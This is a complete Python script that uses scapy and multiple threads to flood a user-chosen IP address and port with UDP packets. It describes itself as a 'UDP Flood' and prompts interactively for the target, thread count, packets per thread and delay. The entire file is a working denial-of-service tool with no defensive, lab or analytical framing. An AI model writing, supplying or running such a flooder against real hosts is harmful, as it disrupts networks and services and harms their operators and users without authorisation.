import threading
import time
from scapy.all import IP, UDP, send

def udp_spammer(thread_id, ip, port, packets, delay):
    print(f"[Thread {thread_id}] Started...")

    for _ in range(packets):
        pkt = IP(dst=ip) / UDP(dport=port)
        send(pkt, verbose=False)

        if delay > 0:
            time.sleep(delay)

    print(f"[Thread {thread_id}] Finished.")

def udp_flood(ip, port, threads, packets, delay):
    print("\nStarting UDP Flood...\n")
    print(f"Target: {ip}:{port}")
    print(f"Threads: {threads} | Packets per thread: {packets}\n\n")

    thread_list = []

    for t in range(threads):
        th = threading.Thread(target=udp_spammer, args=(t + 1, ip, port, packets, delay))
        th.start()
        thread_list.append(th)

    for th in thread_list:
        th.join()

    print("\nUDP Flood Executed.")

def get_int(prompt, default, minimum=1):
    while True:
        try:
            user_input = input(f"{prompt} default({default}): ").strip()
            if not user_input:
                return default
            
            if int(user_input) >= minimum:
                return int(user_input)
            
            print(f"Value must be >= {minimum}")

        except ValueError:
            print("Please enter a number.")

def get_float(prompt, default, minimum=0.0):
    while True:
        try:
            user_input = input(f"{prompt} default({default}): ").strip()
            if not user_input:
                return default
            
            if float(user_input) >= minimum:
                return float(user_input)
            
            print(f"Value must be >= {minimum}")

        except ValueError:
            print("Please enter a number.")

if __name__ == "__main__":
    
    try:
        target_ip = input("Target IP: (default 192.168.1.1): ").strip() or "192.168.1.1"
        target_port = get_int("Target Port: ", default=80)
        num_threads = get_int("Threads: ", default=10)
        num_packets = get_int("Packets per thread: ", default=100)
        delay = get_float("Delay: ", default=0.0)

        udp_flood(target_ip, target_port, num_threads, num_packets, delay)

    except KeyboardInterrupt:
        print("\n[!] Aborted by user.")
        exit(0)
